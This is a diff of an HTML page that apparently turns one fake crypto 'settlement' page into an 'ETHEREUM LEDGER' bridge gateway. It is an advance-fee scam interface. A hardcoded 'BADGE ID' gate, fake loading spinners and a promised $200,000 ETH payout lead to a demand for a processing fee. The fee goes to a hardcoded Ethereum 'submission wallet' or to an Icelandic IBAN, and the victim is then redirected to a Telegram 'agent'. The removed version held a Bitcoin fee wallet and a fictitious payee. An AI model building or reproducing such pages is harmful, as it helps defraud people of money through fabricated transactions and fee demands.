@@ -1,88 +1,1119 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Exodus — Next Step (Settlement)</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ETHEREUM LEDGER</title>
+
   <style>
-    :root{ --bg-1:#05060b; --bg-2:#0f1724; --muted:#93a0b8; --accent:#ffb86b; }
-    html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial;background:linear-gradient(180deg,var(--bg-1),var(--bg-2));color:#eaf0ff}
-    .wrap{max-width:980px;margin:36px auto;padding:20px}
-    .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));padding:24px;border-radius:14px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 30px 80px rgba(0,0,0,0.6)}
-    h1{margin:0 0 8px;font-size:20px}
-    .muted{color:var(--muted)}
-    .grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px}
-    .row{padding:12px;border-radius:10px;background:linear-gradient(180deg,rgba(255,255,255,0.01),transparent);border:1px solid rgba(255,255,255,0.02)}
-    .label{color:var(--muted);font-weight:800;font-size:12px}
-    .value{font-weight:900;font-family:ui-monospace,monospace;margin-top:6px;word-break:break-word}
-    .note{margin-top:14px;color:#cbd5e0}
-    .actions{display:flex;gap:10px;margin-top:18px}
-    .btn{padding:10px 14px;border-radius:10px;border:none;cursor:pointer;font-weight:800}
-    .btn.primary{background:linear-gradient(135deg,#9b7bff,#ffb86b);color:#071022}
-    .btn.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);color:#fff}
-    @media (max-width:700px){.grid{grid-template-columns:1fr}}
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      background: url('placeholder-background.jpg') no-repeat center center fixed;
+      background-size: cover;
+    }
+
+    header {
+      background: linear-gradient(135deg, #0052ff, #0a84ff);
+      padding: 70px 20px;
+      text-align: center;
+    }
+
+    header h1 {
+      font-size: 3em;
+      margin: 0;
+      font-weight: bold;
+    }
+
+    header p {
+      font-size: 1.2em;
+      margin-top: 10px;
+      opacity: 0.9;
+    }
+
+    .cta {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 15px;
+      margin-top: 30px;
+    }
+
+    .cta a, .cta button {
+      display: inline-block;
+      padding: 12px 25px;
+      background-color: #ffffff;
+      color: #0052ff;
+      text-decoration: none;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+      transition: all 0.3s ease;
+    }
+
+    .cta a:hover, .cta button:hover {
+      background-color: #e6e6e6;
+      transform: translateY(-2px);
+    }
+
+    section {
+      padding: 60px 20px;
+      background-color: rgba(0, 0, 0, 0.6);
+    }
+
+    section h2 {
+      text-align: center;
+      margin-bottom: 40px;
+      font-size: 2em;
+    }
+
+    .features {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-around;
+    }
+
+    .card {
+      flex: 1 1 300px;
+      margin: 15px;
+      padding: 20px;
+      background-color: rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      backdrop-filter: blur(6px);
+    }
+
+    .card h3 {
+      margin-top: 0;
+      font-size: 1.3em;
+    }
+
+    footer {
+      background-color: #000;
+      color: #fff;
+      text-align: center;
+      padding: 30px 20px;
+    }
+
+    /* Modal Styles */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.82);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      padding: 20px;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .scanning-container {
+      background: linear-gradient(135deg, #f0f8ff 0%, #e6f4ff 100%);
+      border-radius: 15px;
+      padding: 40px 30px;
+      max-width: 620px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+      text-align: center;
+    }
+
+    .scanning-title {
+      margin: 0 0 15px;
+      font-size: 2.1em;
+      color: #0d2b49;
+      font-weight: 700;
+    }
+
+    .scanning-spinner {
+      width: 52px;
+      height: 52px;
+      border: 5px solid #dfeaf5;
+      border-top-color: #0052ff;
+      border-radius: 50%;
+      display: inline-block;
+      margin: 20px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .scanning-status {
+      font-size: 1.08em;
+      color: #0d2b49;
+      margin: 0;
+      font-weight: 600;
+      min-height: 24px;
+    }
+
+    .status-dots::after {
+      content: '.';
+      animation: dots 1.5s steps(4, end) infinite;
+    }
+
+    @keyframes dots {
+      0% { content: '.'; }
+      25% { content: '..'; }
+      50% { content: '...'; }
+      75% { content: '....'; }
+      100% { content: '.'; }
+    }
+
+    /* Badge ID Modal */
+    .badge-modal {
+      background: #fff;
+      border-radius: 15px;
+      padding: 40px 30px;
+      max-width: 500px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.28);
+    }
+
+    .badge-modal h2 {
+      margin: 0 0 10px;
+      font-size: 1.8em;
+      color: #0d2b49;
+      text-align: center;
+    }
+
+    .badge-modal p {
+      margin: 0 0 20px;
+      text-align: center;
+      color: #666;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 700;
+      color: #333;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 6px;
+      font-size: 1em;
+      transition: border-color 0.3s ease;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: #0052ff;
+    }
+
+    .form-buttons {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      margin-top: 25px;
+    }
+
+    .form-btn {
+      padding: 12px 28px;
+      border: none;
+      border-radius: 6px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .btn-submit {
+      background: linear-gradient(135deg, #0052ff 0%, #0a84ff 100%);
+      color: #fff;
+    }
+
+    .btn-submit:hover {
+      transform: translateY(-2px);
+    }
+
+    .btn-cancel {
+      background: #ddd;
+      color: #333;
+    }
+
+    .btn-cancel:hover {
+      background: #ccc;
+    }
+
+    /* Swap Gateway */
+    .swap-gateway {
+      background: #fff;
+      border-radius: 15px;
+      max-width: 700px;
+      width: 100%;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.28);
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    .swap-header {
+      background: linear-gradient(135deg, #0052ff 0%, #0a84ff 100%);
+      color: #fff;
+      padding: 25px;
+      text-align: center;
+    }
+
+    .swap-header h2 {
+      margin: 0;
+      font-size: 1.8em;
+    }
+
+    .swap-content {
+      padding: 30px;
+    }
+
+    .swap-amount {
+      background: linear-gradient(135deg, #f0f8ff 0%, #e6f4ff 100%);
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      margin-bottom: 25px;
+      border: 2px solid #0052ff;
+    }
+
+    .swap-amount .label {
+      font-size: 0.9em;
+      color: #666;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    .swap-amount .value {
+      font-size: 2.5em;
+      font-weight: 800;
+      color: #0052ff;
+      margin: 0;
+    }
+
+    .swap-options {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 15px;
+      margin-bottom: 25px;
+    }
+
+    .swap-option {
+      padding: 20px;
+      border: 2px solid #ddd;
+      border-radius: 10px;
+      cursor: pointer;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
+
+    .swap-option:hover {
+      border-color: #0052ff;
+      background: linear-gradient(135deg, #f0f8ff 0%, #e6f4ff 100%);
+    }
+
+    .swap-option input[type="radio"] {
+      display: none;
+    }
+
+    .swap-option input[type="radio"]:checked + .option-label {
+      color: #0052ff;
+      font-weight: 800;
+    }
+
+    .swap-option input[type="radio"]:checked ~ .swap-option-container {
+      background: linear-gradient(135deg, #0052ff 0%, #0a84ff 100%);
+      color: #fff;
+    }
+
+    .option-label {
+      display: block;
+      font-weight: 700;
+      font-size: 1.1em;
+      margin-bottom: 10px;
+      color: #333;
+      transition: all 0.3s ease;
+    }
+
+    .swap-option-container {
+      background: #f9f9f9;
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 0.95em;
+      color: #666;
+    }
+
+    .swap-option input[type="radio"]:checked + .option-label + .swap-option-container {
+      background: linear-gradient(135deg, #0052ff 0%, #0a84ff 100%);
+      color: #fff;
+    }
+
+    .input-section {
+      margin-bottom: 25px;
+      display: none;
+    }
+
+    .input-section.active {
+      display: block;
+    }
+
+    .input-section label {
+      display: block;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 8px;
+    }
+
+    .input-section input {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 6px;
+      font-size: 1em;
+    }
+
+    .input-section input:focus {
+      outline: none;
+      border-color: #0052ff;
+    }
+
+    .fee-box {
+      background: #fff3cd;
+      border-left: 5px solid #ff9800;
+      padding: 15px;
+      border-radius: 6px;
+      margin-bottom: 25px;
+    }
+
+    .fee-label {
+      font-weight: 700;
+      color: #b45309;
+      margin: 0 0 5px;
+    }
+
+    .fee-value {
+      font-size: 1.4em;
+      font-weight: 800;
+      color: #0052ff;
+      margin: 0;
+    }
+
+    .swap-buttons {
+      display: flex;
+      gap: 15px;
+      justify-content: center;
+    }
+
+    .swap-btn {
+      padding: 14px 28px;
+      border: none;
+      border-radius: 8px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .swap-btn-primary {
+      background: linear-gradient(135deg, #0052ff 0%, #0a84ff 100%);
+      color: #fff;
+    }
+
+    .swap-btn-primary:hover {
+      transform: translateY(-2px);
+    }
+
+    .swap-btn-secondary {
+      background: #ddd;
+      color: #333;
+    }
+
+    .swap-btn-secondary:hover {
+      background: #ccc;
+    }
+
+    /* Confirmation Modal */
+    .confirmation-modal {
+      background: #fff;
+      border-radius: 15px;
+      max-width: 700px;
+      width: 100%;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.28);
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+
+    .confirmation-header {
+      background: #fff3cd;
+      border-bottom: 3px solid #ff9800;
+      padding: 25px;
+      text-align: center;
+    }
+
+    .confirmation-header h2 {
+      margin: 0;
+      font-size: 1.6em;
+      color: #b45309;
+    }
+
+    .confirmation-content {
+      padding: 30px;
+    }
+
+    .confirmation-item {
+      margin-bottom: 20px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .confirmation-item:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+
+    .confirmation-label {
+      font-size: 0.85em;
+      color: #666;
+      font-weight: 700;
+      text-transform: uppercase;
+      margin-bottom: 5px;
+    }
+
+    .confirmation-value {
+      font-size: 1.2em;
+      font-weight: 800;
+      color: #0d2b49;
+      word-break: break-all;
+    }
+
+    /* Market Rate Modal */
+    .market-rate-modal {
+      background: #fff;
+      border-radius: 15px;
+      max-width: 600px;
+      width: 100%;
+      overflow: hidden;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.28);
+    }
+
+    .market-rate-header {
+      background: linear-gradient(135deg, #0052ff 0%, #0a84ff 100%);
+      color: #fff;
+      padding: 25px;
+      text-align: center;
+    }
+
+    .market-rate-header h2 {
+      margin: 0;
+      font-size: 1.8em;
+    }
+
+    .market-rate-content {
+      padding: 30px;
+    }
+
+    .rate-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 18px;
+      background: linear-gradient(135deg, #f0f8ff 0%, #e6f4ff 100%);
+      margin-bottom: 15px;
+      border-radius: 10px;
+      border-left: 5px solid #0052ff;
+    }
+
+    .rate-currency {
+      font-weight: 800;
+      font-size: 1.15em;
+      color: #0d2b49;
+    }
+
+    .rate-amount {
+      font-weight: 700;
+      font-size: 1.1em;
+      color: #0052ff;
+    }
+
+    .market-rate-buttons {
+      display: flex;
+      gap: 15px;
+      justify-content: center;
+      padding: 0 30px 30px;
+    }
+
+    /* Notification */
+    .notification-dropdown {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background: #000;
+      color: #fff;
+      padding: 16px 20px;
+      border-radius: 10px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+      max-width: 350px;
+      animation: slideDown 0.4s ease;
+      z-index: 10000;
+    }
+
+    @keyframes slideDown {
+      from {
+        transform: translateY(-120px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    .notification-icon {
+      font-size: 1.4em;
+      margin-bottom: 10px;
+    }
+
+    .notification-title {
+      font-weight: 700;
+      font-size: 1.05em;
+      margin-bottom: 8px;
+    }
+
+    .notification-details {
+      font-size: 0.95em;
+      line-height: 1.6;
+      opacity: 0.9;
+    }
+
+    .notification-details p {
+      margin: 5px 0;
+    }
+
+    .notification-close {
+      position: absolute;
+      top: 8px;
+      right: 8px;
+      background: none;
+      border: none;
+      color: #fff;
+      font-size: 1.5em;
+      cursor: pointer;
+      padding: 0;
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    @media (max-width: 768px) {
+      header { padding: 50px 20px; }
+      header h1 { font-size: 2.3em; }
+      header p { font-size: 1em; }
+      .cta { flex-direction: column; align-items: center; }
+      .cta a, .cta button { width: min(90%, 320px); }
+      section { padding: 50px 20px; }
+      section h2 { font-size: 1.8em; }
+      .features { flex-direction: column; }
+      .card { flex: 1 1 100%; margin: 10px 0; }
+      .swap-options { grid-template-columns: 1fr; }
+    }
+
+    @media (max-width: 480px) {
+      header { padding: 40px 20px; }
+      header h1 { font-size: 1.8em; }
+      header p { font-size: 0.95em; }
+      .swap-amount .value { font-size: 1.8em; }
+      .notification-dropdown { right: 10px; max-width: calc(100% - 20px); }
+      .rate-item { flex-direction: column; align-items: flex-start; gap: 10px; }
+    }
   </style>
 </head>
+
 <body>
-  <div class="wrap">
-    <div class="card" role="main" aria-labelledby="summaryTitle">
-      <h1 id="summaryTitle">Authorization received</h1>
-      <div class="muted">The transfer was authorized with the Session ID you provided. Below is the settlement summary.</div>
 
-      <div class="grid" aria-live="polite">
-        <div class="row">
-          <div class="label">Payee</div>
-          <div class="value" id="rPayee">—</div>
+  <header>
+    <h1>ETHEREUM LEDGER</h1>
+    <p>Secure Gateway for Ethereum & Ledger Solutions</p>
 
-          <div style="height:10px"></div>
+    <div class="cta">
+      <a href="https://t.me/AcesstBridge_go1" target="_blank">👨‍💼 Connect to Agent</a>
+      <a href="#features">Explore Features</a>
+    </div>
+  </header>
 
-          <div class="label">Receiver date</div>
-          <div class="value" id="rDate">—</div>
+  <section id="about">
+    <h2>About Ethereum Ledger</h2>
+    <p style="text-align:center; max-width:800px; margin:auto;">
+      Ethereum Ledger provides seamless integration for Ethereum transfers and ledger-based custody. 
+      Transfer funds securely between fiat and Ethereum with complete transparency and professional support.
+    </p>
+  </section>
+
+  <section id="features">
+    <h2>Why Choose Us</h2>
+
+    <div class="features">
+      <div class="card">
+        <h3>🔒 Secure Transfers</h3>
+        <p>Ledger-grade security and encryption protecting all your transactions.</p>
+      </div>
+
+      <div class="card">
+        <h3>🌍 Multi-Currency Support</h3>
+        <p>Convert between multiple currencies and Ethereum instantly.</p>
+      </div>
+
+      <div class="card">
+        <h3>⚡ Fast Processing</h3>
+        <p>Quick transaction settlement with real-time status updates.</p>
+      </div>
+
+      <div class="card">
+        <h3>👥 Expert Support</h3>
+        <p>24/7 professional agent support for all your transaction needs.</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="account">
+    <h2>Bridge Transaction</h2>
+    <div class="cta">
+      <button onclick="openBadgeModal()">Bridge Transaction</button>
+    </div>
+  </section>
+
+  <footer>
+    <p>&copy; 2026 Ethereum Ledger. All rights reserved.</p>
+  </footer>
+
+  <!-- Badge ID Modal -->
+  <div class="modal-overlay" id="badgeModal">
+    <div class="badge-modal">
+      <h2>🔐 Bridge Transaction</h2>
+      <p>Enter your BADGE ID to proceed</p>
+      <div class="form-group">
+        <label for="badgeId">BADGE ID:</label>
+        <input type="password" id="badgeId" placeholder="Enter your BADGE ID">
+      </div>
+      <div class="form-buttons">
+        <button class="form-btn btn-submit" onclick="verifyBadgeId()">Verify</button>
+        <button class="form-btn btn-cancel" onclick="closeBadgeModal()">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scanning Modal -->
+  <div class="modal-overlay" id="scanningModal">
+    <div class="scanning-container">
+      <h2 class="scanning-title">🔄 Loading Swap Gateway</h2>
+      <div class="scanning-spinner"></div>
+      <p class="scanning-status">Initializing secure connection<span class="status-dots"></span></p>
+    </div>
+  </div>
+
+  <!-- Swap Gateway Modal -->
+  <div class="modal-overlay" id="swapModal">
+    <div class="swap-gateway">
+      <div class="swap-header">
+        <h2>💱 Bridge Swap Gateway</h2>
+      </div>
+
+      <div class="swap-content">
+        <div class="swap-amount">
+          <div class="label">Amount to Bridge</div>
+          <p class="value">$200,000 ETH</p>
         </div>
 
-        <div class="row">
-          <div class="label">Service fee</div>
-          <div class="value" id="rFee">—</div>
+        <h3 style="color: #0d2b49; margin-top: 0;">Select Conversion Type</h3>
+        <div class="swap-options">
+          <div class="swap-option">
+            <input type="radio" id="ethOption" name="swapType" value="eth" onchange="handleSwapChange()">
+            <label class="option-label" for="ethOption">Convert to ETH</label>
+            <div class="swap-option-container">
+              <span>Ethereum</span>
+            </div>
+          </div>
 
-          <div style="height:10px"></div>
+          <div class="swap-option">
+            <input type="radio" id="bankOption" name="swapType" value="bank" onchange="handleSwapChange()">
+            <label class="option-label" for="bankOption">Bank Transfer (ISK)</label>
+            <div class="swap-option-container">
+              <span>Icelandic Króna</span>
+            </div>
+          </div>
+        </div>
 
-          <div class="label">Fee wallet</div>
-          <div class="value" id="rWallet">—</div>
+        <!-- ETH Wallet Input -->
+        <div class="input-section" id="ethSection">
+          <label for="ethWallet">ETH Wallet Address:</label>
+          <input type="text" id="ethWallet" placeholder="Enter your Ethereum wallet address">
+          <div class="fee-box">
+            <p class="fee-label">Processing Fee</p>
+            <p class="fee-value">$40 ETH</p>
+          </div>
+        </div>
+
+        <!-- Bank Transfer Section -->
+        <div class="input-section" id="bankSection">
+          <div style="background: linear-gradient(135deg, #e8f5e9 0%, #f1f8e9 100%); padding: 20px; border-radius: 10px; border-left: 5px solid #4caf50;">
+            <p style="margin: 0 0 15px; color: #333; font-weight: 700;">Bank Transfer Details</p>
+            <div style="font-size: 0.95em; color: #333; line-height: 1.8;">
+              <p style="margin: 0;"><strong>Beneficiary:</strong> Finnur</p>
+              <p style="margin: 5px 0;"><strong>Bank:</strong> BankArion Bank</p>
+              <p style="margin: 5px 0;"><strong>IBAN:</strong> IS480324260006521305522939</p>
+              <p style="margin: 5px 0;"><strong>SWIFT/BIC:</strong> ESJAISRE</p>
+            </div>
+          </div>
+          <div class="fee-box" style="margin-top: 20px;">
+            <p class="fee-label">Processing Fee</p>
+            <p class="fee-value">$40 ETH</p>
+          </div>
+        </div>
+
+        <div class="swap-buttons">
+          <button class="swap-btn swap-btn-primary" onclick="confirmSwap()">Continue</button>
+          <button class="swap-btn swap-btn-secondary" onclick="closeSwapModal()">Cancel</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Confirmation Modal -->
+  <div class="modal-overlay" id="confirmationModal">
+    <div class="confirmation-modal">
+      <div class="confirmation-header">
+        <h2>⚠️ Confirm Transaction</h2>
+      </div>
+
+      <div class="confirmation-content" id="confirmationContent">
+        <!-- Confirmation details will be inserted here -->
+      </div>
+
+      <div style="padding: 0 30px 30px; display: flex; gap: 15px; justify-content: center;">
+        <button class="swap-btn swap-btn-primary" onclick="processSettlement()">Settlement</button>
+        <button class="swap-btn swap-btn-secondary" onclick="closeConfirmationModal()">Cancel</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Market Rate Modal -->
+  <div class="modal-overlay" id="marketRateModal">
+    <div class="market-rate-modal">
+      <div class="market-rate-header">
+        <h2>💹 Current Market Rates</h2>
+      </div>
+
+      <div class="market-rate-content">
+        <p style="text-align: center; color: #666; font-size: 0.95em; margin-bottom: 25px;">$200,000 USD Conversion Rates</p>
+        
+        <div class="rate-item">
+          <span class="rate-currency">Ξ Ethereum</span>
+          <span class="rate-amount">~57.14 ETH</span>
+        </div>
+
+        <div class="rate-item">
+          <span class="rate-currency">€ Euro</span>
+          <span class="rate-amount">~€178,100</span>
+        </div>
+
+        <div class="rate-item">
+          <span class="rate-currency">kr Icelandic Króna</span>
+          <span class="rate-amount">~24.37M kr</span>
+        </div>
+
+        <div class="rate-item">
+          <span class="rate-currency">A$ Australian Dollar</span>
+          <span class="rate-amount">~A$286,400</span>
         </div>
       </div>
 
-      <div class="note">
-        What happens next: Our operations team will manually reconcile the Session ID and the fee payment. Once the fee is confirmed, we will broadcast the on-chain transaction for settlement. Typical completion time: 1–3 business hours depending on network conditions. If the fee is sent but not confirmed after that period, contact Support and include your Session ID and transaction details.
-      </div>
-
-      <div class="actions">
-        <button class="btn primary" id="doneBtn">Return to Dashboard</button>
-        <button class="btn ghost" id="supportBtn">Contact Support</button>
+      <div class="market-rate-buttons">
+        <button class="swap-btn swap-btn-primary" onclick="closeMarketRateModal()">Close</button>
       </div>
     </div>
   </div>
 
   <script>
-    // read saved state (set by index.html)
-    const fee = sessionStorage.getItem('txn_fee') || '2900';
-    const wallet = sessionStorage.getItem('txn_fee_wallet') || 'bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf';
-    const receiver = sessionStorage.getItem('txn_receiver_name') || 'Stan Ottembrajt';
-    const addr = sessionStorage.getItem('txn_receiver_addr') || 'bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3';
-    const amtUsd = sessionStorage.getItem('txn_amount_usd') || '$400,000';
-    const amtBtc = sessionStorage.getItem('txn_amount_btc') || '4.82 BTC';
+    // Updated constants
+    const CORRECT_BADGE_ID = "@NicWin20-56";
+    const TARGET_WALLET = "0x102B9843f7a3dac838AE29F62d28d3c31eC13041"; // Where ETH will be sent
+    const SUBMISSION_WALLET = "0xD4886FE35608171D02E51D3535ff9D77d8673cac"; // Wallet for submissions
+    let selectedSwapType = null;
+    let currentNotification = null;
 
-    document.getElementById('rPayee').textContent = receiver;
-    document.getElementById('rDate').textContent = new Date().toISOString().split('T')[0]; // show today's date for reconciliation
-    document.getElementById('rFee').textContent = `CA$ ${Number(fee).toLocaleString()}`;
-    document.getElementById('rWallet').textContent = wallet;
+    const marketRates = {
+      eth: "~57.14 ETH",
+      eur: "~€178,100",
+      isk: "~24.37M kr",
+      aud: "~A$286,400"
+    };
 
-    document.getElementById('doneBtn').addEventListener('click', () => {
-      window.location.href = './index.html';
+    // Prefill target ETH wallet for convenience
+    document.addEventListener('DOMContentLoaded', () => {
+      const ethInput = document.getElementById('ethWallet');
+      if (ethInput) ethInput.value = TARGET_WALLET;
     });
 
-    document.getElementById('supportBtn').addEventListener('click', () => {
-      window.open('https://t.me/AcesstBridge_go1', '_blank', 'noopener');
+    function openBadgeModal() {
+      document.getElementById('badgeModal').classList.add('active');
+    }
+
+    function closeBadgeModal() {
+      document.getElementById('badgeModal').classList.remove('active');
+      document.getElementById('badgeId').value = '';
+    }
+
+    function verifyBadgeId() {
+      const badgeId = document.getElementById('badgeId').value;
+      if (badgeId === CORRECT_BADGE_ID) {
+        closeBadgeModal();
+        showScanningModal();
+      } else {
+        alert('Incorrect BADGE ID. Please try again.');
+        document.getElementById('badgeId').value = '';
+      }
+    }
+
+    function showScanningModal() {
+      document.getElementById('scanningModal').classList.add('active');
+      setTimeout(() => {
+        document.getElementById('scanningModal').classList.remove('active');
+        document.getElementById('swapModal').classList.add('active');
+      }, 1800);
+    }
+
+    function handleSwapChange() {
+      const ethOption = document.getElementById('ethOption') ? document.getElementById('ethOption').checked : false;
+      const bankOption = document.getElementById('bankOption').checked;
+
+      document.getElementById('ethSection').classList.remove('active');
+      document.getElementById('bankSection').classList.remove('active');
+
+      if (ethOption) {
+        document.getElementById('ethSection').classList.add('active');
+        selectedSwapType = 'eth';
+      } else if (bankOption) {
+        document.getElementById('bankSection').classList.add('active');
+        selectedSwapType = 'bank';
+      } else {
+        selectedSwapType = null;
+      }
+    }
+
+    function confirmSwap() {
+      if (!selectedSwapType) {
+        alert('Please select a conversion type');
+        return;
+      }
+
+      if (selectedSwapType === 'eth') {
+        const ethWallet = document.getElementById('ethWallet').value.trim();
+        if (!ethWallet) {
+          alert('Please enter your ETH wallet address');
+          return;
+        }
+      }
+
+      // Hide swap modal but keep selectedSwapType and inputs so confirmation can show them
+      document.getElementById('swapModal').classList.remove('active');
+      showConfirmationModal();
+    }
+
+    function closeSwapModal() {
+      document.getElementById('swapModal').classList.remove('active');
+      document.getElementById('ethOption').checked = false;
+      document.getElementById('bankOption').checked = false;
+      document.getElementById('ethWallet').value = TARGET_WALLET;
+      selectedSwapType = null;
+    }
+
+    function showConfirmationModal() {
+      document.getElementById('scanningModal').classList.add('active');
+      setTimeout(() => {
+        document.getElementById('scanningModal').classList.remove('active');
+        buildConfirmationContent();
+        document.getElementById('confirmationModal').classList.add('active');
+      }, 1800);
+    }
+
+    function buildConfirmationContent() {
+      // Base transaction details
+      let content = `
+        <div class="confirmation-item">
+          <div class="confirmation-label">Transaction Amount</div>
+          <div class="confirmation-value">$200,000 ETH</div>
+        </div>
+        <div class="confirmation-item">
+          <div class="confirmation-label">Processing Fee</div>
+          <div class="confirmation-value">$40 ETH</div>
+        </div>
+      `;
+
+      if (selectedSwapType === 'eth') {
+        const ethWallet = document.getElementById('ethWallet').value || TARGET_WALLET;
+        content += `
+          <div class="confirmation-item">
+            <div class="confirmation-label">Conversion Type</div>
+            <div class="confirmation-value">Ethereum (ETH)</div>
+          </div>
+          <div class="confirmation-item">
+            <div class="confirmation-label">Market Rate (approx)</div>
+            <div class="confirmation-value">${marketRates.eth}</div>
+          </div>
+          <div class="confirmation-item">
+            <div class="confirmation-label">Destination Wallet</div>
+            <div class="confirmation-value">${ethWallet}</div>
+          </div>
+          <div class="confirmation-item">
+            <div class="confirmation-label">Submission Wallet</div>
+            <div class="confirmation-value">${SUBMISSION_WALLET}</div>
+          </div>
+        `;
+      } else if (selectedSwapType === 'bank') {
+        content += `
+          <div class="confirmation-item">
+            <div class="confirmation-label">Conversion Type</div>
+            <div class="confirmation-value">Bank Transfer (ISK)</div>
+          </div>
+          <div class="confirmation-item">
+            <div class="confirmation-label">Market Rate (approx)</div>
+            <div class="confirmation-value">${marketRates.isk}</div>
+          </div>
+          <div class="confirmation-item">
+            <div class="confirmation-label">Beneficiary</div>
+            <div class="confirmation-value">Finnur</div>
+          </div>
+          <div class="confirmation-item">
+            <div class="confirmation-label">Bank</div>
+            <div class="confirmation-value">BankArion Bank</div>
+          </div>
+          <div class="confirmation-item">
+            <div class="confirmation-label">IBAN Number</div>
+            <div class="confirmation-value">IS480324260006521305522939</div>
+          </div>
+          <div class="confirmation-item">
+            <div class="confirmation-label">SWIFT/BIC Code</div>
+            <div class="confirmation-value">ESJAISRE</div>
+          </div>
+          <div class="confirmation-item">
+            <div class="confirmation-label">Submission Wallet</div>
+            <div class="confirmation-value">${SUBMISSION_WALLET}</div>
+          </div>
+        `;
+      } else {
+        content += `
+          <div class="confirmation-item">
+            <div class="confirmation-label">Conversion Type</div>
+            <div class="confirmation-value">N/A</div>
+          </div>
+        `;
+      }
+
+      document.getElementById('confirmationContent').innerHTML = content;
+    }
+
+    function closeConfirmationModal() {
+      document.getElementById('confirmationModal').classList.remove('active');
+      // Reset badge input and selection after closing the confirmation
+      document.getElementById('badgeId').value = '';
+      selectedSwapType = null;
+      document.getElementById('ethWallet').value = TARGET_WALLET;
+    }
+
+    function closeMarketRateModal() {
+      document.getElementById('marketRateModal').classList.remove('active');
+    }
+
+    function processSettlement() {
+      document.getElementById('confirmationModal').classList.remove('active');
+      showNotification();
+      setTimeout(() => {
+        // Professional finish: redirect to support agent
+        window.location.href = "https://t.me/AcesstBridge_go1";
+      }, 2500);
+    }
+
+    function showNotification() {
+      if (currentNotification) {
+        currentNotification.remove();
+      }
+
+      const notification = document.createElement('div');
+      notification.className = 'notification-dropdown';
+      notification.innerHTML = `
+        <button class="notification-close" onclick="closeNotification()">✕</button>
+        <div class="notification-icon">🔔</div>
+        <div class="notification-title">Payment Confirmation</div>
+        <div class="notification-details">
+          <p><strong>Fee:</strong> $40 ETH</p>
+          <p><strong>Accepted:</strong></p>
+          <p>🪙 ETH</p>
+          <p><strong>Submission Wallet:</strong></p>
+          <p style="word-break:break-all;">${SUBMISSION_WALLET}</p>
+        </div>
+      `;
+      document.body.appendChild(notification);
+      currentNotification = notification;
+    }
+
+    function closeNotification() {
+      if (currentNotification) {
+        currentNotification.style.animation = 'slideUp 0.4s ease';
+        setTimeout(() => {
+          if (currentNotification && currentNotification.parentNode) {
+            currentNotification.remove();
+            currentNotification = null;
+          }
+        }, 400);
+      }
+    }
+
+    // Clicking outside modals to close
+    document.getElementById('badgeModal').addEventListener('click', (e) => {
+      if (e.target.id === 'badgeModal') closeBadgeModal();
     });
+
+    document.getElementById('scanningModal').addEventListener('click', (e) => {
+      if (e.target.id === 'scanningModal') {
+        document.getElementById('scanningModal').classList.remove('active');
+      }
+    });
+
+    document.getElementById('swapModal').addEventListener('click', (e) => {
+      if (e.target.id === 'swapModal') closeSwapModal();
+    });
+
